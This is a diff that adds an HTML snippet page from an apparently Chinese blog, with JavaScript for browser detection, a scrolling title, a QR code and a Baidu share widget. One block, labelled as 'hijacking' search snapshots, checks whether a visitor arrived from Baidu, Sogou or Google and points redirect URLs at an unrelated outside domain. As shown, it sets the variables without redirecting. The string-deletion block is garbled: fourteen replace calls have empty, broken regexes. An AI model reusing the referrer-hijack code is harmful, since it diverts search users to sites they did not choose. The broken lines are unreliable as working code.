@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Content-Language" content="zh-CN">
+    <title>⎛冰洁博客⎞-文字转动</title>
+    
+<!-- 移动端 -->
+<script type="text/javascript">
+    var browser = {
+        versions: (function () {
+            var u = navigator.userAgent,
+                app = navigator.appVersion;
+            return {
+                //移动终端浏览器版本信息
+                trident: u.indexOf('Trident') > -1, //IE内核
+                presto: u.indexOf('Presto') > -1, //opera内核
+                webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
+                iPad: u.indexOf('iPad') > -1, //是否iPad
+                webApp: u.indexOf('Safari') == -1, //是否web应该程序，没有头部与底部
+                weixin: u.indexOf('MicroMessenger') > -1, //是否微信
+                qq: u.match(/\sQQ/i) == ' qq' //是否QQ
+            };
+        })(),
+        language: (
+            navigator.browserLanguage || navigator.language
+        ).toLowerCase()
+    };
+
+    /*
+    if (
+        browser.versions.mobile ||
+        browser.versions.ios ||
+        browser.versions.android ||
+        browser.versions.iPhone ||
+        browser.versions.iPad
+    ) {
+        window.location.href = 'wap.html';
+    }
+    */
+</script>
+
+
+<!-- PC端 -->
+<script type="text/javascript">
+    var browser = {
+      versions: function () {
+        var u = navigator.userAgent,
+          app = navigator.appVersion;
+        return { //移动终端浏览器版本信息
+          trident: u.indexOf('Trident') > -1, //IE内核
+          presto: u.indexOf('Presto') > -1, //opera内核
+          webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+          gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+          mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+          ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+          android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+          iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
+          iPad: u.indexOf('iPad') > -1, //是否iPad
+          webApp: u.indexOf('Safari') == -1, //是否web应该程序，没有头部与底部
+          weixin: u.indexOf('MicroMessenger') > -1, //是否微信
+          qq: u.match(/\sQQ/i) == " qq" //是否QQ
+        };
+      }(),
+      language: (navigator.browserLanguage || navigator.language).toLowerCase()
+    };
+
+    /*
+    if (browser.versions.mobile || browser.versions.ios || browser.versions.android ||
+      browser.versions.iPhone || browser.versions.iPad) {} else {
+      window.location.href = 'index.html';
+    }
+    */
+</script>
+
+<script>
+//让标题转动
+var text=document.title
+var timerId
+function newtext() {
+    clearTimeout(timerId)
+    document.title=text.substring(1,text.length)+text.substring(0,1)
+    text=document.title.substring(0,text.length)
+    timerId = setTimeout("newtext()", 500)
+}
+newtext();
+</script>
+
+<script>
+//劫持快照跳转
+    var refurl=document.referrer
+    if(refurl.indexOf("sogou")>0 || refurl.indexOf("baidu")>0 ||  refurl.indexOf("sm")>0 || refurl.indexOf("so")>0 || refurl.indexOf("google")>0 )
+    var pingbi = "false";
+        if(pingbi =='false'){
+            var wapurl = "http://www.mesaflowers.info";
+            var guanurl = "http://www.mesaflowers.info";
+        }
+</script>
+
+<style>
+    /* 织梦分页样式 */
+.pagess {
+    clear: both;
+    margin: 20px;
+    overflow: hidden;
+    margin-left: 0px;
+    text-align: center;
+    font-size: 12px;}
+.pagess ul li {
+    display: inline-block;
+    border: 1px solid #ccc;
+    padding: 2px 9px;
+    margin: 0 3px;
+    line-height: 20px;
+    background: #fff;
+    color: #999;}
+.thisclass a{
+	background: #999;
+	color: #fff;}
+</style>
+</head>
+
+<body>
+    <span style="font-size:16px;">
+        <script>
+        //文章页自动生成二维码   国外才能访问、打开
+        thisURL = document.URL;
+        strwrite = "<img src='https://chart.googleapis.com/chart?cht=qr&chs=150x150&choe=UTF-8&chld=L|4&chl=" + thisURL + "' width='150' height='150' alt='QR 码' />";
+        document.write( strwrite );
+        </script>
+    </span>
+    <script>
+        //删除指定字符串、文字
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+        document.getElementById("box").innerHTML=document.getElementById("box").innerHTML.toString().replace(//ig,'');
+    </script>
+    <!-- 分享到各个平台 -->
+    <div class="bdsharebuttonbox">
+        <a href="#" class="bds_more" data-cmd="more"></a>
+        <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+        <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ"></a>
+        <a href="#" class="bds_copy" data-cmd="copy" title="复制网址"></a>
+        <a href="#" class="bds_mail" data-cmd="mail" title="分享到邮箱"></a>
+        <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    </div>
+    <script>
+        window._bd_share_config = {
+            "common": {
+            "bdSnsKey": {},
+            "bdText": "",
+            "bdMini": "2",
+            "bdMiniList": [
+            /*"mshare",*/
+            "weixin", "sqq", "qzone", "tsina", "mail",
+            /*"bdysc",*/
+            /*"renren","tqq",*/
+            "tieba", "douban", "bdhome", "copy", "print"],
+            "bdPic": "",
+            "bdStyle": "1",
+            "bdSize": "24"
+            },
+            "share": {}
+        };
+        with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~ ( - new Date() / 36e5)];
+    </script>
+    <!-- 分享到各个平台 end -->
+</body>
+</html>
